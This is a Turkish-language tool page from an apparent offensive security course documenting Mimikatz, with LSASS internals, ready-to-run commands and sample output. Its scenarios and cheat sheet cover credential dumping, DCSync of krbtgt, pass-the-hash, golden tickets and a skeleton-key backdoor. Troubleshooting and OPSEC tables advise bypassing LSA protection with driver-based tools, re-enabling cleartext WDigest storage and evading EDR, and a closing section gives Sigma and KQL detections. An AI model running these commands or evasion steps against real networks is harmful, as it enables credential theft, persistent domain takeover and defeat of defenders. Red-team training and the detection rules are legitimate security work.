# Mimikatz

> **Kategori:** [7. Bellek Analizi, LSASS Dökümü ve Kasa Hasadı](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Windows Local Security Authority Subsystem Service (LSASS) bellek alanını doğrudan okuyarak düz metin parolaları, NTLM karmalarını ve Kerberos biletlerini çıkaran; uzaktan DCSync ve DCShadow protokol manipülasyonları gerçekleştiren; Golden/Silver bilet sahteciliği, Pass-the-Hash (PTH) ve Skeleton Key kalıcılık tekniklerini yöneten Active Directory sızma testlerinin temel bellek analizi motoru.

---

## 1. Genel Bakış ve Amaç

Windows işletim sistemlerinde kullanıcı oturum açtığında, işletim sistemi kullanıcının kimlik bilgilerini tekrar tekrar sormamak amacıyla `lsass.exe` (Local Security Authority Subsystem Service) sürecinin bellek alanında önbelleğe alır. Bu bellek alanı; Kerberos biletleri, NTLM karmaları, DPAPI anahtarları ve eski Windows sürümlerinde düz metin (plaintext) parolaları barındıran Güvenlik Paketleri (`msv1_0.dll`, `kerberos.dll`, `wdigest.dll`, `tspkg.dll`, `credssp.dll`) tarafından yönetilir.

**`Mimikatz`** (Benjamin Delpy / @gentilkiwi tarafından geliştirilen), Windows güvenlik mimarisini tersine mühendislikle çözerek modern Active Directory saldırı metodolojisini baştan aşağı değiştiren efsanevi bir araçtır. Araç, `SeDebugPrivilege` ayrıcalığını kullanarak LSASS bellek alanına doğrudan kancalar atar (`Memory Read / DLL Injection`), şifreli parola bloklarını çözen özel anahtarları dinamik olarak bulur ve şu kritik saldırı vektörlerini tek bir çatı altında sunar:
- **`sekurlsa` Modülü:** LSASS bellek alanını canlı olarak veya harici bir minidump dosyası üzerinden çevrimdışı analiz ederek tüm aktif oturumların parolalarını ve biletlerini döker.
- **`lsadump` Modülü:** Microsoft Dizin Çoğaltma Servisi Uzak Protokolü'nü (MS-DRSR) kullanarak etki alanı denetleyicisi ile replike olur (`DCSync`) ve NTDS.dit veritabanındaki tüm kullanıcıların (özellikle `krbtgt`) parola karmalarını ağ üzerinden çeker.
- **`kerberos` Modülü:** Belleğe bilet enjekte eder (`ptt`), KDC'yi taklit ederek sahte Golden ve Silver biletler üretir.
- **`misc::skeleton` Modülü:** LSASS sürecine yama uygulayarak tüm etki alanı kullanıcıları için geçerli bir ana parola (Skeleton Key) tanımlar.

### Mimari Akış Şeması

```
[ Saldırgan / Yönetici Komut İstemi (Yönetici Hakları) ]
       │
       ├── (1) privilege::debug  ──> [ SeDebugPrivilege Aktif Edilir ]
       │
       ├── (2) Yerel Bellek Saldırıları (Canlı LSASS Analizi)
       │     ├── sekurlsa::logonpasswords ──> NTLM Hash, Kerberos Keys, Cleartext
       │     ├── sekurlsa::tickets /export ──> Bellekteki .kirbi Biletlerini Çek
       │     ├── sekurlsa::pth            ──> NTLM Hash ile Yeni Süreç Başlat (PTH)
       │     └── misc::skeleton           ──> LSASS İçine 'mimikatz' Ana Parolasını Enjekte Et
       │
       ├── (3) Çevrimdışı Analiz (EDR Atlatma Yolu)
       │     └── sekurlsa::minidump lsass.dmp ──> Ham Minidump Analizi
       │
       └── (4) Ağ Tabanlı Replikasyon Saldırıları (DCSync / DCShadow)
             └── lsadump::dcsync /domain:corp.local /user:krbtgt
                   │
                   ▼ (MS-DRSR / DSGetNCChanges RPC Çağrısı)
             [ Domain Controller (Port 135 / RPC Dinamik Port) ]
                   │
                   ▼ (Kullanıcı NTLM Hash ve AES Anahtarları Döner)
             [ KRBTGT Hash'i Ele Geçirildi -> Golden Ticket ]
```

### Neden Önemli?

| Yetenek / Özellik | Açıklama | Operasyonel Değeri |
|---|---|---|
| **LSASS Bellek Çözümleme** | Şifrelenmiş kimlik paketlerini bellekten okuyup anında açık metin ve hash'e dönüştürür. | Parolası bilinmeyen kullanıcı oturumlarını anında ele geçirmeyi sağlar. |
| **DCSync Yeteneği** | Hedef DC üzerinde kod çalıştırmadan uzaktan DRSR protokolüyle kullanıcı hash'lerini çeker. | Etki alanı denetleyicisine dokunmadan tüm Active Directory'yi ele geçirme standardıdır. |
| **Pass-the-Hash (PTH)** | Parola metnine ihtiyaç duymadan doğrudan NTLM hash ile yeni kimlik oturumu başlatır. | Ağda yanal hareketin en temel ve en hızlı yapı taşıdır. |
| **Bilet Sahteciliği** | Golden ve Silver ticket inşa ederek kalıcı etki alanı hakimiyeti kurar. | Tüm parolalar değiştirilse dahi etki alanına geri dönüş kapısı bırakır. |
| **Çevrimdışı Döküm Desteği**| Farklı LOLBin'ler ile alınmış LSASS dökümlerini analiz edebilir. | Kurban makinede Mimikatz çalıştırmadan EDR dedektörlerini baypas eder. |

### Karşılaştırma Tablosu

| Kriter | Mimikatz | SharpKatz | pypykatz | lsassy |
|---|---|---|---|---|
| **Platform** | Windows (Yerel C / Win32) | Windows (.NET / C#) | Çapraz Platform (Python) | Linux (Python / Impacket) |
| **Gereken Ayrıcalık** | Local Administrator / SYSTEM | Local Administrator | Bağımsız (Çevrimdışı) | Uzak Admin (SMB/RPC) |
| **EDR İmza Hassasiyeti**| Aşırı Yüksek (Tüm EDR'lar) | Orta (Bellek İçi C#) | Sıfır (Host Dışı) | Düşük (DLL Injection Yok) |
| **DCSync Desteği** | Var (`lsadump::dcsync`) | Var | Yok | Var (secretsdump motoru) |
| **Skeleton Key Enjeksiyonu**| Var (`misc::skeleton`) | Yok | Yok | Yok |

### 1.1 LSA Güvenlik Destek Sağlayıcıları (SSP/AP) ve Bellek İçi Veri Yapıları

Windows LSA mimarisi, kimlik doğrulama mekanizmalarını modüler hale getirmek için **Güvenlik Destek Sağlayıcısı (Security Support Provider - SSP)** ve **Kimlik Doğrulama Paketi (Authentication Package - AP)** arabirimlerini kullanır. `lsass.exe` süreci başlatıldığında aşağıdaki kritik DLL kütüphaneleri sürece yüklenir ve her biri oturum açan kullanıcıların kimlik materyallerini kendi iç bellek yapılarında (Logon Session Lists) saklar:

- **`msv1_0.dll` (MSV1_0 SSP/AP):** Yerel kullanıcı ve NTLM kimlik doğrulamasını yönetir. Kullanıcının LM/NTLM hash'lerini ve etki alanı kimlik bilgilerini `_KIWI_MSV1_0_PRIMARY_CREDENTIALS` yapısı altında tutar.
- **`kerberos.dll` (Kerberos SSP/AP):** Active Directory Kerberos protokolünü yönetir. Kullanıcının oturum açma biletlerini (TGT), servis biletlerini (TGS) ve AES-256/128 / RC4 şifreleme anahtarlarını `_KIWI_KERBEROS_LOGON_SESSION_LIST` bağlantılı listelerinde saklar.
- **`wdigest.dll` (Digest SSP):** HTTP ve SASL tabanlı Digest kimlik doğrulamasını yürütür. Eski Windows sürümlerinde (Windows 8.1 öncesi) Digest şifreleme anahtarını üretebilmek için kullanıcının düz metin (plaintext) parolasını bellekte açık tutar.
- **`tspkg.dll` (CredSSP):** Uzak Masaüstü Bağlantısı (RDP) için Ağ Seviyesinde Kimlik Doğrulama (NLA) mekanizmasını sağlar. RDP oturumu sırasında düz metin kimlik bilgilerini geçici olarak önbelleğe alır.
- **`cloudap.dll` (Cloud AP):** Azure AD / Microsoft Entra ID hibrit kimlik doğrulamalarında Primary Refresh Token (PRT) paketlerini ve bulut oturum anahtarlarını yönetir.

`Mimikatz`'ın `sekurlsa` modülü, bu DLL'lerin bellek alanındaki `LogonSessionList` işaretçilerini (pointers) dinamik olarak bularak bağlantılı listeleri tarar ve LSA'nın şifreleme fonksiyonlarını (`LsaProtectMemory` / `LsaUnprotectMemory`) taklit ederek verileri anında deşifre eder.

### 1.2 Donanım ve Çekirdek Tabanlı İzolasyon Mekanizmaları (VBS & Credential Guard)

Modern kurumsal Windows ortamlarında LSASS sürecine yönelik doğrudan bellek okumalarını engellemek için iki temel savunma mimarisi kullanılır:

1. **LSA Korumalı Süreç (RunAsPPL - Protected Process Light):**
   - LSASS süreci `PsProtectedSignerWinTCB` seviyesinde bir korumalı süreç olarak başlatılır.
   - `SeDebugPrivilege` ayrıcalığına sahip yerel SYSTEM veya Administrator oturumları bile standart `OpenProcess` Win32 API çağrısı ile LSASS sürecine `PROCESS_VM_READ` veya `PROCESS_ALL_ACCESS` yetkisiyle handle açamaz.
   - Mimikatz bu durumda `ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005 - Access Denied)` hatası verir.

2. **Windows Defender Credential Guard (VBS - Virtualization-Based Security):**
   - Hyper-V sanallaştırma katmanını kullanarak belleği iki izole düzeye böler: **VTL 0** (Normal İşletim Sistemi / Normal User Mode) ve **VTL 1** (İzole Kullanıcı Modu - IUM / Güvenli Dünya).
   - NTLM hash'leri, Kerberos biletleri ve anahtarları VTL 0'da çalışan normal `lsass.exe` yerine VTL 1 içinde izole edilen `LsaIso.exe` (Isolated LSA) süreci içinde saklanır.
   - Saldırgan ana işletim sisteminde (VTL 0) tam çekirdek (Kernel) yetkisi dahi elde etse, hipervizör (Hyper-V) bellek izolasyonunu koruduğu için `LsaIso.exe` belleğine erişemez. Mimikatz çalıştırıldığında hash ve parolalar `(null)` olarak döner.

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

```cmd
mimikatz.exe "komut1" "komut2" ... exit
mimikatz.exe # (İnteraktif Kabuk Modu)
```

### Kritik Modüller ve Parametre Tablosu

| Modül & Komut | Açıklama | Örnek Kullanım |
|---|---|---|
| `privilege::debug` | LSASS belleğini okumak için gereken `SeDebugPrivilege` ayrıcalığını edinir. | `privilege::debug` |
| `sekurlsa::logonpasswords` | Tüm güvenlik paketlerindeki parolaları, NTLM hash'lerini ve biletleri döker. | `sekurlsa::logonpasswords` |
| `sekurlsa::wdigest` | WDigest sağlayıcısındaki düz metin parolaları ayıklar. | `sekurlsa::wdigest` |
| `sekurlsa::kerberos` | Bellekteki Kerberos şifreleme anahtarlarını ve TGT/TGS biletlerini listeler. | `sekurlsa::kerberos` |
| `sekurlsa::tickets /export` | LSA belleğindeki tüm biletleri `.kirbi` dosyaları halinde diske kaydeder. | `sekurlsa::tickets /export` |
| `sekurlsa::pth` | NTLM hash'ini kullanarak yeni bir komut istemi açar (Pass-the-Hash). | `sekurlsa::pth /user:admin /domain:corp /ntlm:<hash>` |
| `sekurlsa::minidump <dosya>` | Canlı bellek yerine belirtilen minidump dosyasını analiz bağlamına alır. | `sekurlsa::minidump lsass.dmp` |
| `lsadump::dcsync` | Domain Controller'dan DRSR protokolüyle belirtilen kullanıcının hash'ini çeker. | `lsadump::dcsync /domain:corp.local /user:krbtgt` |
| `lsadump::lsa /patch` | Yerel LSA kayıtlarını ve SAM kovanını yamalayarak yerel parolaları döker. | `lsadump::lsa /patch` |
| `kerberos::golden` | KRBTGT anahtarıyla sahte TGT (Golden Ticket) üretir. | `kerberos::golden /domain:... /sid:... /rc4:... /ptt` |
| `kerberos::silver` | Servis anahtarıyla hedef servis için sahte TGS (Silver Ticket) üretir. | `kerberos::silver /domain:... /sid:... /target:... /ptt` |
| `kerberos::ptt <dosya>` | Belirtilen `.kirbi` biletini geçerli oturumun LSA önbelleğine enjekte eder. | `kerberos::ptt ticket.kirbi` |
| `misc::skeleton` | LSASS içine 'mimikatz' ana parolasını (Skeleton Key) enjekte eder. | `misc::skeleton` |
| `token::elevate` | Token hırsızlığı yaparak oturumu SYSTEM veya Domain Admin seviyesine yükseltir. | `token::elevate` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: LSASS Belleğinden Kimlik Bilgilerini Dökme (Tek Satırlık Çalıştırma)

Yerel yönetici oturumunda `SeDebugPrivilege` ayrıcalığı alınır, `sekurlsa::logonpasswords` çalıştırılır ve işlem bittiğinde Mimikatz otomatik olarak kapatılır.

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

**Konsol Çıktısı Analizi:**

```text
  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Clé, Avec de Gentilkiwi"
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
  '#####'                                     >Datas  * * */

mimikatz(powershell) # privilege::debug
Privilege '20' OK

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 285493 (00000000:00045b35)
Session           : Interactive from 1
User Name         : DA_Admin
Domain            : CORP
Logon Server      : DC01
Logon Time        : 14/04/2026 16:30:11
SID               : S-1-5-21-2559786414-2279769532-2164155192-1104
        msv1_0 :
         * [00000003] Primary
         * NTLM     : 01fc5a6be7bc6929c40372d23f5052b3
         * SHA1     : 4b5a6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b
        wdigest :
         * Username : DA_Admin
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : DA_Admin
         * Domain   : CORP.LOCAL
         * Password : (null)
```

---

### Senaryo 2: Uzaktan DCSync Saldırısı ile KRBTGT Parola Karmasını Çekme

DCSync haklarına sahip bir kullanıcı oturumundayken etki alanı denetleyicisinin `krbtgt` hesabı uzaktan sorgulanır.

```cmd
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
```

**Konsol Çıktısı Analizi:**

```text
[DC] 'corp.local' will be the domain
[DC] 'DC01.corp.local' will be the DC server
[DC] 'krbtgt' will be the user account

Object RDN           : krbtgt
Current RID          : 502
User-Account-Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )

Credentials:
  Hash NTLM: 9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d
    ntlm- 0: 9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d
    lm  - 0: aad3b435b51404eeaad3b435b51404ee
  aes256_cts_hmac_sha1: 1673a9f0e1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8
  aes128_cts_hmac_sha1: c20f18c6d48259a8c089b7e6f5a4b3c2
```

---

### Senaryo 3: Pass-the-Hash (PTH) ile Yeni Komut İstemi Başlatma

Ele geçirilen `Administrator` NTLM hash'i kullanılarak yeni bir kimlik bağlamında `cmd.exe` açılır.

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:01fc5a6be7bc6929c40372d23f5052b3 /run:cmd.exe" exit
```

---

### Senaryo 4: Golden Ticket Üretimi ve Mevcut Oturuma Enjeksiyonu (`/ptt`)

```cmd
mimikatz.exe "kerberos::golden /domain:corp.local /sid:S-1-5-21-2559786414-2279769532-2164155192 /rc4:9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d /user:SuperAdmin /id:500 /groups:512,513,519,520 /ptt" exit
```

```cmd
:: Enjekte edilen bilet ile DC C$ paylaşımına erişim:
dir \\dc01.corp.local\C$
```

---

### Senaryo 5: Çevrimdışı Alınmış Minidump Dosyasını İnceleme

Kurban makinede Mimikatz çalıştırmadan `comsvcs.dll` veya `nanodump` ile alınan `lsass.dmp` dosyası saldırganın kendi Windows laboratuvarında analiz edilir.

```cmd
mimikatz.exe "sekurlsa::minidump C:\Temp\lsass.dmp" "sekurlsa::logonpasswords" exit
```

---

### Senaryo 6: Skeleton Key Kalıcılık Saldırısı

Domain Controller üzerinde yerel SYSTEM yetkileriyle LSASS sürecine yama uygulanarak, tüm etki alanı hesaplarının kendi şifrelerine ek olarak `mimikatz` parolası ile de oturum açabilmesi sağlanır.

```cmd
mimikatz.exe "privilege::debug" "misc::skeleton" exit
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (0xc0000061)` | Mevcut süreçte `SeDebugPrivilege` ayrıcalığı yok (Standart kullanıcı veya UAC devrede). | Komut istemini "Yönetici Olarak Çalıştır" (Elevated) ile başlatın veya yerel yetki yükseltme (LPE) uygulayın. |
| `ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)` | Hedef sistemde `RunAsPPL` (Protected Process Light) koruması aktif; LSASS sürecine `PROCESS_VM_READ` engelleniyor. | PPL korumasını aşmak için `PPLMedic`, `PPLDump` veya BYOVD tabanlı `PPLKiller` araçlarını kullanın. |
| `ERROR kuhl_m_lsadump_dcsync ; RPC_S_SERVER_UNAVAILABLE (0x000006ba)` | Domain Controller RPC portu (135) veya dinamik RPC portları güvenlik duvarı tarafından engelleniyor. | Ağ erişimini kontrol edin, DC IP adresini `/dc:` parametresiyle açıkça belirtin. |
| `WDigest cleartext passwords show (null)` | Windows 8.1 ve Server 2012 R2 sonrası WDigest düz metin şifre saklama varsayılan olarak kapalıdır. | Kayıt defterinde `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest` altındaki `UseLogonCredential` değerini `1` yapın ve kullanıcının tekrar oturum açmasını bekleyin. |
| `Process immediately terminated by Defender` | Mimikatz ikilisi Defender veya EDR tarafından statik/sezgisel olarak yakalandı. | İkiliyi doğrudan diske bırakmayın; `execute-assembly` ile bellekte çalıştırın veya `lsassy`/`nanodump` gibi alternatiflere geçin. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
        GÜRÜLTÜ SEVİYESİ: ÇOK YÜKSEK (EDR ALARMI & LSASS ERİŞİMİ)
──────────────────────────────────────────────────────────────────
[ Windows Logları ] : Event ID 4672 (Admin Logon), Event ID 4662 (DCSync)
[ Sysmon ]          : Event ID 10 (ProcessAccess: Source -> lsass.exe)
[ EDR / AV ]        : LSASS Handle Açma, Mimikatz Stringleri, PPL İhlali
[ Replikasyon İzi ] : Directory Service Replication Olay Kayıtları
```

### 5.1 Bırakılan İzler (Artifacts & Event Logs)

1. **Sysmon Event ID 10 (Process Access):**
   - Kaynak sürecin (`mimikatz.exe`, `powershell.exe`) hedef `C:\Windows\System32\lsass.exe` sürecine `0x1010` (`PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ`) veya `0x1fffff` (`PROCESS_ALL_ACCESS`) erişim maskesiyle açık bir handle talep etmesi. EDR'ların en temel tespit mekanizmasıdır.
   - **CallTrace Analizi:** Bellek dökümü sırasında `CallTrace` alanında `dbghelp.dll!MiniDumpWriteDump` veya `dbgcore.dll` kütüphanelerinin çağrılması veya doğrudan unbacked (diskte karşılığı olmayan hafıza alanı) bellekten gelen Win32 API çağrıları sezgisel alarmları tetikler.
2. **Windows Security Event ID 4624 (Logon Type 9 - NewCredentials):**
   - `sekurlsa::pth` komutu çalıştırıldığında Windows üzerinde `LogonType 9` (NewCredentials) tipinde bir oturum oluşturulur. Bu olayda `LogonProcessName` değeri `seclogo` olarak kaydedilir. Yerel makinede geçerli kullanıcının yetkileri korunurken ağ çağrılarında hedef NTLM hash'i kullanılır.
3. **Windows Security Event ID 4662 (Operation on Directory Service Object):**
   - DCSync çalıştırıldığında etki alanı denetleyicisi üzerinde `DS-Replication-Get-Changes-All` (`1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`) genişletilmiş yetki çağrısı denetim günlüğüne kaydedilir.
4. **Skeleton Key İmzaları:**
   - LSASS bellek alanında yapılan yama sonucunda DC yeniden başlatılana kadar bellek bütünlük kontrolleri (Memory Integrity) alarm üretebilir.

### 5.2 Ağ ve EDR İmzaları

- **DCSync Ağ İmzası:** DC'ler arasında olması gereken `DRSGetNCChanges` RPC çağrısının standart bir iş istasyonundan (Workstation IP) başlatılması SIEM motorlarında kritik seviyeli alarm üretir.
- **Statik İmza Yoğunluğu:** Mimikatz kaynak kodundaki telif hakları, fonksiyon isimleri ve metin dizgileri dünya genelindeki tüm güvenlik ürünlerince kara listededir.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araçtaki Karşılığı |
|---|---|---|
| **T1003.001** | OS Credential Dumping: LSASS Memory | `sekurlsa::logonpasswords` ile bellekten şifre ve hash çekme. |
| **T1003.006** | OS Credential Dumping: DCSync | `lsadump::dcsync` ile etki alanı veritabanını replike etme. |
| **T1550.002** | Use Alternate Authentication Material: Pass the Hash | `sekurlsa::pth` ile hash üzerinden süreç başlatma. |
| **T1558.001** | Steal or Forge Kerberos Tickets: Golden Ticket | `kerberos::golden` ile sahte TGT üretme. |
| **T1078** | Valid Accounts: Domain Accounts | Çalınan kimliklerle sisteme oturum açma. |

### 5.4 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Önlem ve Operasyonel Tavsiye |
|---|---|
| **Doğrudan LSASS'a Dokunma** | Canlı sistemde asla doğrudan `sekurlsa::logonpasswords` çalıştırmayın. `nanodump` veya `Dumpert` ile bellek kopyasını alın, Mimikatz'ı kendi analiz makinenizde (`sekurlsa::minidump`) çalıştırın. |
| **DCSync Gürültüsü** | `/all` parametresiyle tüm kullanıcıları çekmeyin; yalnızca operasyonel gereksinim olan tekil kullanıcıları (`/user:krbtgt` veya `/user:target_admin`) sorgulayın. |
| **İkili Tespiti** | Mimikatz ikilisini asla diske yazmayın; C2 framework'leri üzerinden `execute-assembly` veya bellek enjeksiyonu kullanın. |

### 5.5 Savunma Karşılığı (Blue Team / KQL & Sigma)

**Sigma Kuralı — LSASS Sürecine Şüpheli Erişim Tespiti (Sysmon Event ID 10):**

```yaml
title: Suspicious LSASS Process Access via Mimikatz
status: experimental
description: Detects suspicious process access to lsass.exe with high privilege access masks.
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 10
    TargetImage|endswith: '\lsass.exe'
    GrantedAccess:
      - '0x1fffff'
      - '0x1010'
      - '0x1410'
  filter:
    SourceImage|endswith:
      - '\svchost.exe'
      - '\csrss.exe'
  condition: selection and not filter
level: critical
```

**Microsoft Sentinel (KQL) — Şüpheli DCSync Replikasyon Tespiti:**

```kql
SecurityEvent
| where EventID == 4662
| where ObjectServer == "DS"
| where AccessMask == "0x100"
| where Properties has "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" // DS-Replication-Get-Changes-All
| where SubjectAccount !endswith "$" // Makine hesabı olmayan meşru DC dışı sorgular
| project TimeGenerated, Computer, SubjectAccount, Properties, IpAddress
```

**Microsoft Sentinel (KQL) — Pass-the-Hash (Logon Type 9) Tespiti:**

```kql
SecurityEvent
| where EventID == 4624
| where LogonType == 9 // NewCredentials (PTH oturumu)
| where AuthenticationPackageName == "Negotiate"
| where LogonProcessName == "seclogo"
| project TimeGenerated, Computer, SubjectUserName, TargetUserName, TargetDomainName, IpAddress, ProcessName
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: LSASS Belleğinden Tüm Parolaları ve Hash'leri Dökme
```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```
- **Ne Yapar?** `SeDebugPrivilege` ayrıcalığını alır, LSASS bellek alanını okuyarak aktif tüm oturumların NTLM hash'lerini, Kerberos anahtarlarını ve WDigest parolalarını ekrana basar.
- **Ne Zaman Kullanılır?** Yerel yönetici haklarına sahip olunan bir sistemde diğer kullanıcıların kimlik bilgilerini çalmak için.
- **Parametreler:** `privilege::debug`: Hata ayıklama ayrıcalığı, `sekurlsa::logonpasswords`: Parola döküm motoru.

### Komut 2: Uzaktan KRBTGT DCSync Saldırısı
```cmd
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
```
- **Ne Yapar?** Domain Controller ile DRSR protokolü üzerinden konuşarak `krbtgt` hesabının NTLM hash'ini ve AES anahtarlarını uzaktan çeker.
- **Ne Zaman Kullanılır?** Golden Ticket üretmek için gereken anahtarları elde etmek amacıyla.
- **Parametreler:** `/domain`: Etki alanı FQDN adı, `/user`: Hedef kullanıcı adı (`krbtgt`).

### Komut 3: Pass-the-Hash ile Yeni Süreç Başlatma
```cmd
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:01fc5a... /run:cmd.exe" exit
```
- **Ne Yapar?** Düz metin parola girmeksizin NTLM hash'ini kullanarak yeni bir kimlik belirteci (token) ile `cmd.exe` başlatır.
- **Ne Zaman Kullanılır?** Hash elde edildikten sonra hedef ağdaki diğer sunuculara uzaktan bağlanmak için.
- **Parametreler:** `/user`: Kullanıcı adı, `/ntlm`: NTLM karma değeri, `/run`: Çalıştırılacak uygulama.

### Komut 4: Golden Ticket Oluşturma ve Belleğe Enjekte Etme
```cmd
mimikatz.exe "kerberos::golden /domain:corp.local /sid:S-1-5-21-... /rc4:9a8b... /user:FakeAdmin /id:500 /groups:512,519 /ptt" exit
```
- **Ne Yapar?** KRBTGT hash'i kullanarak sahte bir TGT inşa eder ve `/ptt` bayrağı ile doğrudan geçerli oturuma yükler.
- **Ne Zaman Kullanılır?** Etki alanında sınırsız ve tespit edilmesi güç yönetici erişimi elde etmek için.
- **Parametreler:** `/sid`: Etki alanı SID'si, `/rc4`: KRBTGT NTLM hash'i, `/ptt`: Pass-the-Ticket bayrağı.

### Komut 5: Bellekteki Biletleri Diske Aktarma
```cmd
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit
```
- **Ne Yapar?** LSA belleğindeki tüm Kerberos TGT ve TGS biletlerini `.kirbi` dosyaları halinde geçerli dizine kaydeder.
- **Ne Zaman Kullanılır?** Başka sistemlere bilet taşımak veya biletleri çevrimdışı kırmak için.
- **Parametreler:** `/export`: Dışa aktarma bayrağı.

### Komut 6: Çevrimdışı Minidump Analizi
```cmd
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
```
- **Ne Yapar?** Canlı LSASS yerine diskteki `lsass.dmp` minidump dosyasını çözümleyerek parolaları döker.
- **Ne Zaman Kullanılır?** Kurban makinede EDR olduğu için canlı bellek okunamadığında, kopyalanan dökümü kendi makinenizde incelemek için.
- **Parametreler:** `sekurlsa::minidump`: Minidump dosya yolu.

### Komut 7: Yerel SAM Kovanından Hash Dökümü
```cmd
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit
```
- **Ne Yapar?** Yerel SYSTEM yetkilerine yükselir ve yerel Administrator dahil tüm yerel hesapların LM/NTLM hash'lerini SAM kovanından çıkarır.
- **Ne Zaman Kullanılır?** Etki alanı dışındaki yerel makine hesaplarının parolalarını toplamak için.
- **Parametreler:** `lsadump::sam`: SAM döküm komutu.

### Komut 8: Yerel LSA Sırlarını ve DPAPI Yedek Anahtarlarını Çekme
```cmd
mimikatz.exe "privilege::debug" "lsadump::secrets" exit
```
- **Ne Yapar?** Windows servis parolalarını, önbelleğe alınmış etki alanı kimliklerini ve DPAPI System Credential anahtarlarını listeler.
- **Ne Zaman Kullanılır?** Servis hesaplarının düz metin şifrelerini ve DPAPI şifre çözme anahtarlarını almak için.
- **Parametreler:** `lsadump::secrets`: LSA sırları komutu.

### Komut 9: Bilet Enjeksiyonu (Pass-the-Ticket)
```cmd
mimikatz.exe "kerberos::ptt ticket.kirbi" exit
```
- **Ne Yapar?** Belirtilen `.kirbi` dosyasını mevcut oturumun LSA önbelleğine enjekte eder.
- **Ne Zaman Kullanılır?** Önceden çalınan veya üretilen bilet ile hedef sistemlere erişim sağlamak için.
- **Parametreler:** `kerberos::ptt`: Bilet yükleme komutu.

### Komut 10: Skeleton Key Kalıcılık Enjeksiyonu
```cmd
mimikatz.exe "privilege::debug" "misc::skeleton" exit
```
- **Ne Yapar?** Domain Controller üzerindeki LSASS sürecine yama uygulayarak tüm kullanıcılar için `mimikatz` master parolasını aktif eder.
- **Ne Zaman Kullanılır?** DC ele geçirildikten sonra sistemde fark edilmesi imkansıza yakın bir arka kapı bırakmak için.
- **Parametreler:** `misc::skeleton`: Skeleton key komutu.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [Gentilkiwi / Mimikatz](https://github.com/gentilkiwi/mimikatz)
- **Benjamin Delpy Blog:** [Blog Gentilkiwi - Mimikatz Releases & Research](https://blog.gentilkiwi.com/)
- **MITRE ATT&CK Referansı:** [T1003.001 - LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)
- **SpecterOps Araştırması:** [Detecting and Mitigating Mimikatz DCSync and Skeleton Key](https://posts.specterops.io/)

---

> **Önceki:** [← Kirbikator (Kategori 06)](../Kategori_06_Kerberos_Protokol_Cephaneligi/Kirbikator.md) · **Sonraki:** [pypykatz →](./pypykatz.md)
